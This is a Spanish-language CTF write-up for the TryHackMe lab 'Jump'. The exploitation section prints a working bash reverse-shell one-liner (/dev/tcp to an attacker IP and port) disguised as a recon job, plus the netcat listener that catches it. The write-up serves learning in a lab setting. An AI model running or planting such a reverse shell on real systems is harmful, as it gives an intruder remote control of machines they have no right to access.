# Jump - TryHackMe

**Fecha de resolución:** 20 de agosto de 2026

Primera máquina que hice en TryHackMe.

## Reconocimiento

```
ping 10.128.128.244
```

## Enumeración

El servicio expuesto documenta su propio funcionamiento en un README accesible: procesa automáticamente cualquier archivo depositado en un directorio `incoming/`, ignorando los formatos que no reconoce.

```
[ recon pipeline ]

All recon jobs must be placed in incoming/.
Files are processed automatically on arrival.
Invalid formats are ignored.
```

Esto describe un pipeline que ejecuta lo que se deposita ahí sin validarlo como es debido.

## Explotación

Preparé un script (`test.sh`) camuflado como un "trabajo de recon" más, con una reverse shell hacia mi máquina:

```
#!/bin/bash
bash -i >& /dev/tcp/192.168.164.208/5555 0>&1
```

Lo dejé caer en `incoming/` y, al ser recogido y ejecutado automáticamente por el propio pipeline, recibí la conexión en mi listener (`nc -lvnp 5555`), quedando con shell en la máquina.

---

GitHub: [github.com/germanvegaa](https://github.com/germanvegaa)
TryHackMe: [tryhackme.com/p/G3RM4N](https://tryhackme.com/p/G3RM4N)
HackTheBox: [app.hackthebox.com/public/users/3990132](https://app.hackthebox.com/public/users/3990132)
